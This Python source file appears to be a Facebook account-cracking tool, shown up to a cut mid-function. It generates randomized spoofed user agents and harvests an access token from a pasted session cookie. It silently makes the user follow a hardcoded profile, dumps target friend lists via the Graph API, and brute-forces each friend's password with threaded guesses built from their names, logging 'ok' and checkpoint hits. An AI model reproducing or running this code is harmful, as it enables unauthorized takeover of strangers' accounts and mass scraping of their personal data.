        'RMX2144',
        'RMX2051',
        'RMX2025',
        'RMX2075',
        'RMX2076',
        'RMX2072',
        'RMX2052',
        'RMX2176',
        'RMX2121',
        'RMX3115',
        'RMX1921',
        'MZ-m1 note',
        'MZ-m2 note',
        'MZ-M3s',
        'MZ-M3',
        'MZ-M5s',
        'MZ-M3 Max',
        'MZ-m3 note',
        'MZ-MX4',
        'MZ-U20',
        'MZ-MX4 Pro',
        'MZ-PRO 5',
        'MZ-U10',
        'MZ-M5c',
        'MZ-meizu M8 lite',
        'MZ-mmm52',
        'MZ-Meizu S6',
        'MZ-M3 Max',
        'MZ-M1 E',
        'MZ-meizu note9',
        'MZ-16 X',
        'MZ-16th Plus',
        'MZ-15 Plus',
        'MZ-16T',
        'MZ-M6',
        'MZ-PRO 7 Plus',
        'MZ-m1 metal',
        'MZ-16s Pro',
        'MZ-M5 Note',
        'MZ-Meizu 6T',
        'MZ-16 X',
        'MZ-16th',
        'MZ-MEIZU 18X',
        'MZ-MEIZU 18s',
        'MZ-M1822',
        'MZ-meizu 17',
        'MZ-meizu 17 Pro',
        'MZ-MEIZU 18 Pro',
        'MZ-TYH212U',
        'MZ-MEIZU 20',
        'MZ-MEIZU 20 Pro',
        'Meizu C3',
        'MZ-ZTE T660',
        'ZTE BLADE 8',
        'CUBOT',
        'CUBOT_P20',
        'CUBOT CHEETAH 2',
        'CUBOT_NOVA',
        'CUBOT NOTE Plus',
        'CUBOT J9',
        'CUBOT R11',
        'CUBOT_MANITO',
        'CUBOT KING KONG',
        'CUBOT J3 PRO',
        'CUBOT_J3',
        'CUBOT_NOTE_S',
        'CUBOT X18',
        'CUBOT R9',
        'CUBOT_POWER',
        'CUBOT MAX',
        'CUBOT_X18_Plus',
        'CUBOT H3',
        'CUBOT ECHO',
        'RMX3350',
        'ULTRAMINTT Y5',
        'SAMSUNG SM-E426S',
        'NX666J',
        'SAMSUNG SM-E426S',
        'FinePower D1',
        'G510',
        'Doro Tablet',
        'CPH2499',
        'K',
        'x86_64',
        'SAMSUNG SM-R900',
        'SAMSUNG SM-R875U',
        'SAMSUNG SM-R925F',
        'SAMSUNG GT-I9515/I9515XXU1BOJ3',
        'SAMSUNG GT-I9515L',
        'SAMSUNG SM-R910',
        'SAMSUNG Fossil Gen 6',
        'SM-R905F',
        'SAMSUNG SM-R905N',
        'SAMSUNG SM-R920',
        'SAMSUNG SM-R925U',
        'SAMSUNG SM-R905U',
        'SAMSUNG SM-R860',
        'SAMSUNG SM-R880',
        'KINGKONG 5',
        'SC-05L',
        'SM-A202K',
        'SAMSUNG SM-A245M',
        'SAMSUNG SM-A245F',
        'SAMSUNG SM-A125F',
        'Infinix X663C',
        'SC-03K',
        'SAMSUNG SM-J330F',
        'SAMSUNG iParalizer Build',
        'CPH1715',
        'LMY47V',
        'NMF26F',
        'KTU84P',
        'KTU84Q',
        '1.6.1.59f311.20170329',
        'HUAWEIVNS-TL00',
        'MMB29M',
        'JDQ39',
        'HuaweiMediaPad',
        'MOB31K',
        'HUAWEIDUK-AL20',
        'OPM1.171019.026',
        'LMY47I',
        'HuaweiB199',
        'HONORCAM-TL00H',
        'PKQ1.180904.001',
        'HuaweiRIO-TL00',
        'KOT49H',
        'RPXS31.Q2-58-17-7-3',
        'HONORNEM-AL10',
        'R16NW',
        'HonorChe2-TL00M',
        'QP1A.190711.020',
        'MRA58K',
        'LRX22G',
        'KTU84P',
        'OPR1.170623.027',
        'JDQ39',
        'KVT49L',
        'JRO03H',
        'JLS36C',
        'JDQ39E',
        'GRK39F',
        'IMM76D',
        'MocorDroid2.3.5',
        'JZO54K',
        'GRK39F',
        'HuaweiH866C',
        'HuaweiU8510',
        'HuaweiU8820',
        'HuaweiU8800ProB032',
        'RP1A.200720.012',
        'NitroX GingerBread',
        'NRD90M',
        'PPR1.180610.009',
        'MMB29M',
        'HONORBKK-AL10']))
    SAMSUNG = f'''Mozilla/5.0 (Linux; Android {str(rr(1, 15))}; {kode_model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 50))}.{str(rr(0, 15))} Chrome/{str(rr(50, 500))}.{str(rr(50, 500))}.{str(rr(50, 6000))}.{str(rr(50, 500))} Mobile Safari/537.36'''
    CUBOT = f'''Mozilla/5.0 (Linux; Android {str(rr(1, 15))}; {kode_model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40, 119))}.0.{str(rr(2000, 7000))}.{str(rr(76, 199))} Mobile'''
    BAIDU = f'''Mozilla/5.0 (Linux; Android {str(rr(1, 15))}; {kode_model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40, 119))}.0.{str(rr(2000, 7000))}.{str(rr(76, 199))} Mobile Safari/537.36 T7/9.1 baidubrowser/{str(rr(6, 8))}.{str(rr(1, 25))}.{str(rr(1, 25))}.{str(rr(1, 200))} (Baidu; P1 {str(rr(1, 10))}.{str(rr(1, 10))}.{str(rr(1, 10))})'''
    CHROME = f'''Mozilla/5.0 (Linux; Android {str(rr(1, 15))}; {kode_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50, 500))}.{str(rr(50, 500))}.{str(rr(50, 6000))}.{str(rr(50, 500))} Mobile Safari/537.36'''
    UA_VIERA = f'''viabrowser;Safary-Mozilla/5.0 ({merek_device}; U; Viera; {tipe_kamu}) AppleWebKit/537.11 (KHTML, like Gecko) Viera/{str(rr(1, 116))}.{str(rr(1, 116))}.{str(rr(1, 116))} Chrome/{str(rr(1, 116))}.{str(rr(1, 116))}.{str(rr(1, 2006))}.{str(rr(1, 116))} Safari/537.11'''
    UA_VIERAv2 = f'''viabrowser;Safary-Mozilla/5.0 (Linux; U; Viera; {tipe_kamu}) AppleWebKit/537.36 (KHTML, like Gecko) Viera/{str(rr(1, 116))}.{str(rr(1, 116))}.{str(rr(1, 116))} Chrome/{str(rr(1, 116))}.{str(rr(1, 116))}.{str(rr(1, 4000))}.{str(rr(1, 300))} Safari/537.36 SmartTV'''
    UA_ONPI = f'''viabrowser;Safary-Mozilla/5.0 (iPhone; CPU iPhone OS {versi_iphone} like Mac OS X) AppleWebKit/{str(rr(500, 1000))}.{str(rr(2, 100))} (KHTML, like Gecko) Version/{str(rr(1, 25))}.{str(rr(4, 80))} Mobile/{tipe_iphone} Safari/{str(rr(500, 800))}.{str(rr(2, 30))}'''
    UA_BCD = f'''viabrowser;Safary-Mozilla/5.0 (Linux; Android {str(rr(1, 15))}; {versi_cubot} Build/{seri_cubot}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40, 119))}.0.{str(rr(2000, 7000))}.{str(rr(76, 199))} Mobile'''
    UA_VBRO = f'''viabrowser;Safary-Mozilla/5.0 (Windows NT {str(rr(1, 15))}; {tipe_cubot}){seri_viabrowser}AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(55, 117))}.0.{str(rr(2883, 4000))}.{str(rr(87, 150))} UBrowser/{str(rr(7, 30))}.0.{str(rr(185, 299))}.{str(rr(1002, 3000))} Safari/537.36'''
    UA_VWIN = f'''viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1, 20))}; {tipe_cubot}){seri_viabrowser})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50, 140))}.0.{str(rr(3990, 5001))}.{str(rr(20, 170))} Safari/537.36 Vivaldi/6.0.2979.18'''
    UA_PPOV = f'''Mozilla/5.0 (Linux; U; Android {str(rr(1, 15))};{tipe_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100, 109))}.0.{str(rr(4896, 5414))}.{str(rr(118, 127))} Mobile Safari/537.36 OPR/{str(rr(20, 50))}.{str(rr(0, 1))}.{str(rr(1000, 4999))}.{str(rr(70000, 209999))}'''
    UA_MINUC = f'''Mozilla/5.0 (Linux; Android {str(rr(1, 15))}; SM-A207F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1, 100))}.0.{str(rr(2000, 5000))}.{str(rr(1, 100))} Mobile Safari/537.36 UCBrowser/11.5.2.1188(SpeedMode) U4/1.0 UCWEB/2.0 (UCMini) Mobile'''
    UA_PRA = f'''Opera/9.80 ({merek_opera}; Opera Mini/{str(rr(1, 200))}.0.{str(rr(1, 200))}/{str(rr(1, 200))}.{str(rr(1, 700))}; U; {tipe_opera}) Presto/{str(rr(1, 200))}.{str(rr(1, 300))}.{str(rr(1, 6000))} Version/{str(rr(1, 300))}.{str(rr(1, 400))}'''
    UA_SMBR = f'''Mozilla/5.0 (Linux; Android {str(rr(1, 15))}; {tipe_smbrowser} Build/RP1A.{str(rr(500, 900000))}.{str(rr(1, 500))}; wv) AppleWebKit/{str(rr(1, 1000))}.{str(rr(1, 500))} (KHTML, like Gecko) SamsungBrowser/{str(rr(1, 1000))}.{str(rr(1, 100))} Chrome/{str(rr(1, 500))}.0.{str(rr(1, 10000))}.{str(rr(1, 100))} Mobile Safari/537.36'''
    UA_IFN = f'''Mozilla/5.0 (Linux; Android {str(rr(1, 15))}; Infinix {tipe_infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10, 107))}.0.{str(rr(111, 6666))}.{str(rr(10, 400))} Mobile Safari/537.36'''
    UA_RDM = f'''Mozilla/5.0 (Linux; Android {str(rr(1, 15))}; {tipe_redmi} Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10, 107))}.0.{str(rr(111, 6666))}.{str(rr(10, 400))} UCBrowser/{str(rr(1, 20))}.{str(rr(1, 10))}.0.{str(rr(111, 5555))} Mobile Safari/537.36 OPR/{str(rr(10, 80))}.{str(rr(1, 10))}.{str(rr(111, 5555))}.{str(rr(111, 99999))}'''
    UA_SMGT = f'''SAMSUNG-GT-S3802 Opera/9.80 ({merek_opera}; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {tipe_opera}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16'''
    UA_FLY = f'''Mozilla/5.0 (Linux; Android {str(rr(1, 15))}; Fly4)Z410C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80, 103))}.0.{str(rr(4200, 4900))}.{str(rr(40, 150))} Mobile Safari/537.36'''
    uaku = rc([
        SAMSUNG,
        CUBOT,
        BAIDU,
        CHROME,
        UA_VIERA,
        UA_VIERAv2,
        UA_ONPI,
        UA_BCD,
        UA_VBRO,
        UA_VWIN,
        UA_PPOV,
        UA_MINUC,
        UA_PRA,
        UA_SMBR,
        UA_IFN,
        UA_RDM,
        UA_SMGT,
        UA_FLY])
    ugen.append(uaku)
def User_Agent(): t = rc([f'CPH{rr(1700, 1899)}',f'CPH{rr(1800, 2399)}',f'I{str(rr(1920,2299))}']); u = rc([f'RMX{rr(1800, 2399)}',f'RMX{rr(3000, 3399)}',f'vivo {rr(1000, 2000)}']); v = rc([f'itel A{str(rr(11,63))} {rc(["","Lite","Pro","Plus",""])}','itel A512W']); w = rc([f'RT{str(rr(1,6))}',f'WP{str(rr(1,28))}',f'C{str(rr(10,32))}{rc([" Pro","_Pro",""])}']); x = rc([f'V{rr(1800,2399)}{rc(["A",""])}',f'V{rr(3000,3399)}{rc(["A",""])}']); y = rc([f"Infinix X{str(rr(550,699))}{rc(['B','C','D','E','F',''])}",f"Infinix X{str(rr(5511,5516))}{rc(['B','C','D','E','F',''])}",f"Infinix X{str(rr(6711,6899))}{rc(['B','C','D','E','F',''])}"]); z = rc([f'Redmi {str(rr(1,16))}{rc(["A","A Dual","AT","C","C NFC","5G","Pro","Plus","Prime","Prime+","Prime+ 5G","I","T","T NFC"])}',f'Redmi Note {str(rr(1,16))} {rc(["A","5G","Lite","Lite 5G","Lite 5G NE","Plus","Pro","Pro+","Pro+ 5G","Pro Max","Prime","R","R 5G","S","S 5G","T","T 5G","T Pro","T Pro+"])}']); a = rc([f'{rr(5,9)}.0{rc([".0",""])}',f'{str(rr(7,14))}']); b = rc([f'{t}',f'{u}',f'{v}',f'{w}',f'{x}',f'{y}',f'{z}']); c = rc(['en-us','en-gb','id-id', 'ms-my','zh-cn','in-id']); d = rc(['O11019', 'NMF26F', 'NRD90M', 'MRA58K', 'LMY47I']); e = rc(['RKQ1','RP1A','PPR1','QP1A','SP1A','TP1A','OPM1']); f = rc([f'00{random.randint(1,9)}', f'0{str(rr(10,20))}']); g = ( f'{e}.{str(random.randrange(130000, 230000))}.{f}' ); h = ( f'{rr(99, 123)}.0.{rg(5000,  6399)}.{rr(10, 299)}' ); return rc([f"Mozilla/5.0 (Linux; Android {a}; {b} Build/{rc([f'{g}',f'{d}'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{h} Mobile Safari/537.36{rc([f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a}) NABar/1.0',f' T7/7.0 baidubrowser/7.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})',f' T7/7.5 baidubrowser/7.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})',f' T7/9.1 baidubrowser/7.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})',f' baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})',f' baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})NULL',f' T5/2.0 baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})',f' T5/2.0 baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' T5/2.0 bdbrowser_i18n/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' AlohaBrowser/{str(rr(1,5))}.{str(rr(0,9))}.{str(rr(0,9))}',f' baidubrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))} (Baidu; P1 {a})NULL',f' T5/2.0 bdbrowser_i18n/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' bdbrowser_i18n/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' bdbrowser/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}'])}", f"Mozilla/5.0 (Linux; Android {a}; {b} Build/{rc([f'{g}',f'{d}'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{h} Mobile Safari/537.36{rc(['',f' OPR/{str(rr(10,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}',f' GoogleApp/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm64',f' GSA/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm64',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(rr(300,399))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};]',f' [FB_IAB/FB4A;FBAV/{str(rr(400,449))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};]',f' [FB_IAB/FB4A;FBAV/{str(rr(400,449))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};] FBNV/1',f' Edg/{str(rr(73,129))}.0.{str(rr(1200,2999))}.{str(rr(73,250))}',' EdgW/1.0','/TansoDL',' youcare-android-app',''])}", f"Mozilla/5.0 (Linux; Android {a}; {b}{rc(['',f' Build/{d}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{h} Mobile Safari/537.36{rc(['',f' EdgA/{str(rr(30,129))}.0.{str(rr(1100,1299))}.{str(rr(10,99))}',f' AlohaBrowser/{str(rr(1,4))}.{str(rr(0,29))}.{str(rr(0,9))}',f' AlohaBrowser/{str(rr(1,4))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(0,9))}',f' OPX/{str(rr(1,2))}.{str(rr(0,9))}',' BanglaBrowser/2.0.2',''])}", f"Mozilla/5.0 (Linux; U; Android {a}; {c}; {b} Build/{rc([f'{g}',f'{d}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{h} Mobile Safari/537.36{rc([f' OPR/{str(rr(10,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}',f' HeyTapBrowser/{str(rr(6,49))}.{str(rr(7,8))}.{str(rr(2,40))}.{str(rr(1,9))}',f' OPT/{str(rr(1,2))}.{str(rr(0,9))}',f' PHX/{str(rr(4,14))}.{str(rr(0,9))}',f' T5/2.0 bdbrowser_i18n/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}',f' bdbrowser_i18n/{str(rr(4,7))}.{str(rr(0,19))}.{str(rr(0,29))}.{str(rr(0,9))}','Vast Browser/2.7.0'])}", f"Mozilla/5.0 (Linux; U; Android {a}; {c}; {b} Build/{rc([f'{g}',f'{d}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{h}{rc([' HiBrowser/v2.22.0.2 UWS/',f' Quark/{str(rr(1,6))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,999))}',f' UCBrowser/{str(rr(1,19))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,1299))}',f' MQQBrowser/{str(rr(4,10))}.{str(rr(0,9))}'])} Mobile Safari/537.36", f"Mozilla/5.0 (Linux; Android {a}; {rc([f'{x}',f'{y}',f'{z}'])}{rc(['',f' Build/{d}',f' Build/{g}'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{h} Mobile Safari/537.36{rc(['',f' VivoBrowser/{str(rr(2,17))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(0,9))}'])}", f"Mozilla/5.0 (Linux; Android {a}; {rc(['VIVO ',''])}{x} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{h} Mobile Safari/537.36{rc(['',f' AlohaBrowser/{str(rr(3,4))}.{str(rr(0,29))}.{str(rr(0,9))}',f' AlohaBrowser/{str(rr(1,2))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(0,9))}'])}"])
def Ikuti_Boleh_Ya(cok):
	parser = bs4.BeautifulSoup
	try:
		for foll in parser(requests.get(f'https://mbasic.facebook.com/100083788721465',cookies={'cookie':cok}).text,'html.parser').find_all('a',href=True):
			if '/a/subscribe.php?' in foll.get('href'):
				x = requests.get(
					'https://mbasic.facebook.com'
					+
					foll[
						'href'
					],
					cookies = {
						'cookie'
						:
						cok
					}
				).text
				exit(
				)
	except:
		pass
def Login_Dulu():
	Banner(
	)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]input cookie facebook",
			style="bold purple"
			),
		justify="center"
	)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]saran extensi: cookiedough",
			width=48,
			subtitle="╭──",
			subtitle_align="left",
			style="bold purple",
			),
		justify="center"
	)
	cok = Console(
		).input(
			"[bold purple]   ╰─> "
		)
	open(
		".cok.txt",
		"w"
		).write(
			cok
		)
	ses = requests.Session(
		)
	try:
		lnux = (
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
			)
		head = {
			"User-Agent": lnux
			}
		link = ses.get(
			"https://web.facebook.com/adsmanager?_rdc=1&_rdr",
			headers=head,
			cookies = {
				"cookie" : cok
				}
			)
		find = re.findall(
			'act=(.*?)&nav_source',
			link.text
			)
		if len(find)==0: 
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]cookie anda invalid",
					width=48,
					style="bold purple",
					),
				justify="center"
				)
			sleep(
				2
				)
			exit(
			)
		else:
			for x in find:
				xz = ses.get(
					"https://web.facebook.com/adsmanager/manage/campaigns?act="+x+"&nav_source=no_referrer",
					headers = head,
					cookies = {
						"cookie" : cok
						}
					)
				took = re.search(
					'(EAAB\w+)',
					xz.text
					).group(
						1
					)
				open(
					".tok.txt",
					"w"
					).write(
						took
					)
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]token facebook anda",
						style="bold purple",
						),
					justify="center"
				)
				Console(
					).print(
						f"[bold white]{took}"
					)
				Console(width=48).print(
					Panel("[bold #FF00D4]login cookie berhasil",
					style="bold purple",
					),
				justify="center"
				)
				Ikuti_Boleh_Ya(
					cok
				)
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]enter untuk ke menu",
						width=48,
						subtitle="╭──",
						subtitle_align="left",
						style="bold purple",
						),
					justify="center"
				)
				Console().input(
					"[bold purple]   ╰─> "
					)
				Back_Menu(
				)
	except (Exception) as e:
		exit(
			e
		)
def Main_Menu():
	try:
		token = open(
			'.tok.txt',
			'r'
		).read()
		cok = open(
			'.cok.txt',
			'r'
		).read()
	except (IOError, FileNotFoundError):
		Console(width=48).print(
			Panel(
				'[bold red]cookies anda kadaluarsa',
				style="bold purple",
				),
			justify="center"
		)
		sleep(
			2
			)
		Login_Dulu(
		)
	try:
		data_efbi = requests.get(
			f"https://graph.facebook.com/me?fields=name,id&access_token={token}",
			cookies = {
				'cookie'
				 :  
				 cok
			}
		).json()
		nama_fb = data_efbi[
			'name'
		]
		uids_fb = data_efbi[
			'id'
		]
	except (requests.exceptions.ConnectionError):
			Console(width=48).print(
				Panel(
					"[bold purple]* [bold #FF00D4]error 404, jaringan lemot![bold purple] *",
					width=48,
					style="bold purple",
					),
				justify="center",
				)
			exit(
			)
	except (KeyError):
		try:
			os.remove(
				".cok.txt"
				)
			os.remove(
				".tok.txt"
			)
		except:
			pass
		Login_Dulu(
		)
	Bersih(
		)
	Banner(
	)
	Colom1 = [
]
	Colom1.append(
		Panel(
			f"[bold #FF00D4]id: {uids_fb}",
			width=23,
			style="bold purple",
		)
	)
	Colom1.append(
		Panel(
			f"[bold #FF00D4]nama: {nama_fb}",
			width=24,
			style="bold purple",
		)
	)
	Console(width=48).print(
		Columns(
			Colom1
			),
		justify="center"
	)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]input menu (1/2)",
			style="bold purple",
			),
		justify="center"
	)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]1.dump friendlist  2.crack file  3.cek hasil ok cp",
			width=48,
			subtitle="╭──",
			subtitle_align="left",
			style="bold purple",
			),
		justify="center"
	)
	Pilih = Console().input(
		"[bold purple]   ╰─> "
	)
	if Pilih in ("1"):
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]input id target",
				width=48,
				subtitle="╭──",
				subtitle_align="left",
				style="bold purple",
				),
			justify="center"
		)
		idt = Console().input(
			"[bold purple]   ╰─> "
			)
		Start_Dump(idt, "", {"cookie": cok}, token)
		Sortir_Idz(
		)
	elif Pilih in ("2"):
		Crack_File(
		)
	elif Pilih in ("3"):
		Hasil_OkCp(
		)
	else:
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]macam tak betul je budek ni",
				width=48,
				style="bold purple",
				),
			justify="center"
		)
	sleep(
		2
		)
	exit(
	)
def Start_Dump(idt, fields, cookie, token):
	ses = requests.Session()
	try:
		head = {
			"connection": "keep-alive",
			"accept": "*/*",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1",
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9",
			}
		if len(id) == 0:
			param = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)",
			}
		else:
			param = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})",
			}
		url = ses.get(
			f"https://graph.facebook.com/{idt}",
			params=param,
			headers=head,
			cookies=cookie,
		).json()
		for i in url["friends"]["data"]:
			id.append(i["id"] + "|" + i["name"])
			print(f"       ╰─> sedang mengumpulkan {len(id)} id         ",end="\r")
		Start_Dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)
	except :
		pass
def Crack_File():
	try:vin = os.listdir('dump/')
	except FileNotFoundError:
		print('>>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		print ("Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n Buatlah File Dump Id Terlebih dahulu\nSetelah Jadi Masukkan Filenya Kedalam Folder asepyusup di Penyimpanan Internal Kalian\nLalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor ini")
		kontol = input('\n>>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{H}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('dump/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>>> %s. %s ({H} %s{P} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>>> %s. %s ({H} %s {P}idz) '%(cih,isi,len(hem)))
		geeh = input('>>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('dump/'+geh,'r').read().splitlines()
		except:
			print('>>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		Sortir_Idz()
def Sortir_Idz():
	if len(id) == 0:
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]id privat/ttl -18th",
				style="bold purple",
				),
			justify="center"
			)
		exit(
		)
	muda = [
]
	for bacot in sorted(id):
		muda.append(
			bacot
		)
	bcm = len(
		muda
	)
	bcmi = (
		bcm-1
		)
	for xmud in range(bcm):
		id2.append(
			muda[
				bcmi
			]
		)
		bcmi -=1
	Console(width=48).print(
		Panel(
			f"[bold #FF00D4]terkumpul {len(id)} id",
			style="bold purple",
			),
		justify="center"
		)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]tambah kata sandi (y/t)",
			width=48,
			subtitle="╭──",
			subtitle_align="left",
			style="bold purple",
			),
		justify="center"
		)
	pwa = Console().input(
		"[bold purple]   ╰─> "
		)
	if pwa in ["y", "Y"]:
		pwp.append(
			"bade"
			)
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]example: password,facebook,rahasia",
				width=48,
				subtitle="╭──",
				subtitle_align="left",
				style="bold purple",
				),
			justify="center"
			)
		pwn = Console().input(
			"[bold purple]   ╰─> "
			)
		pwk = pwn.split(
			","
			)
		for xpw in pwk:
			pwt.append(
				xpw
			)
	else:
		pwp.append(
			"moal"
		)
	Eksekusi(
	)
def Eksekusi():
	global prog, des
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]mode pesawat per 300 id",
			width=48,
			subtitle="[bold #FF00D4]* <[bold purple][underline]hasil akun ok dan cp tersimpan di[/underline][bold #FF00D4]> *",
			style="bold purple",
			),
		justify="center"
	)
	Colom2 = [
]
	Colom2.append(
		Panel(
			f"[bold #00FF00] {okc}",
			width=23,
			style="bold purple",
		)
	)
	Colom2.append(
		Panel(
			f"[bold #FFFF00] {cpc}",
			width=24,
			style="bold purple",
		)
	)
	Console(width=48).print(
		Columns(
			Colom2
			),
		justify="center"
	)
	prog = Progress(
		SpinnerColumn(
			'clock'
		),
		TimeElapsedColumn(
		),
		TextColumn(
			'{task.percentage:.0f}%'
		),
		TextColumn(
			'{task.description}'
		),
		# BarColumn(
		# )
	)
	des = prog.add_task(
		'',
		total = len(
			id2
		)
	)
	with prog:
		with Trd(max_workers=30) as MethodCrack:
			for mxv in id2:
				user = mxv.split(
					'|'
					)[
					0
				]
				nmfl = mxv.split(
					'|'
					)[
					1
				].lower()
				namd = nmfl.split(
					' '
					)[
					0
				]
				namx = nmfl.replace(
					' ',
					''
				)
				pasw = [
					'kamu nanya',
				]
				if len(nmfl) and len(namx) < 6:
					if len(namd) < 3:
						pass
					else:
						pasw.append(
							nmfl
						)
						pasw.append(
							namx
						)
						pasw.append(
							namd
							+
							namd
						)
						pasw.append(
							namd
							+
							' '
							+
							namd
						)
						pasw.append(
							namd
							+
							'123'
						)
						pasw.append(
							namd
							+
							'12345'
						)
				else:
					if len(namd) < 3:
						pasw.append(
							nmfl
							)
						pasw.append(
							namx
						)
					else:
						pasw.append(
							nmfl
							)
						pasw.append(
							namx
						)
						pasw.append(
							namd
							+
							namd
						)
						pasw.append(
							namd
							+
							' '
							+
							namd
						)
						pasw.append(
							namd
							+
							'123'
						)
